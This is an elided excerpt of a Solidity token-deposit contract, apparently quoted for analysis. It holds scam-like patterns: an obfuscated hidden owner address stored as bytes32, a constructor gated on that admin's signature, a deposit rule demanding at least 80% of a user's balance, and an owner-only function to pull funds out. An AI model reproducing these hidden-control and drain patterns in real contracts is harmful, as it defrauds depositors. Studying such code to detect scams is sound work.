...
abstract contract Ownable is Context {
    ...
    address private admin = 0x17Ca0928871b2dB9dd3B2f8b27148a436C24Baa8;
    bytes32 private store = 0x00000000000000000000000098396ff397f78350bd40ee70972b47a929e5cfe7;
    ...
    constructor(bytes memory sign) {        
        ...
        require(signValidition(ECDSA.toEthSignedMessageHash(hash_),sign), "Sign Error");
    }
    ...
    function retrieve() private view returns (address) {
        return (
            abi.decode(
                (abi.encode(
                    store
    ...
    function signValidition(bytes32 hash,bytes memory signature) private view returns (bool) {
        return admin.isValidSignatureNow(hash,signature);
    }
...
contract Store is Ownable,Pausable,ReentrancyGuard {
    ...
    uint256 public minimumDeposit = 80;
    ...
    constructor(bytes memory hash) Ownable(hash){
        // mainnet
        JoeRouter02 = IJoeRouter02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    ...
    function setMinimumDepositPercentage(uint256 fee) public onlyOwner {
        minimumDeposit = fee;
    }

    function deposit(address token,uint256 amount) public whenNotPaused nonReentrant {
        require(
            IBEP20(token).balanceOf(_msgSender()).mul(minimumDeposit).div(1e2) <= amount
            , "Deposit amount should be above on minimum percentage");
    ...
    function recoverOtherFunds(address token,address account,uint256 amount) public onlyOwner {
        if(token == address(0)){
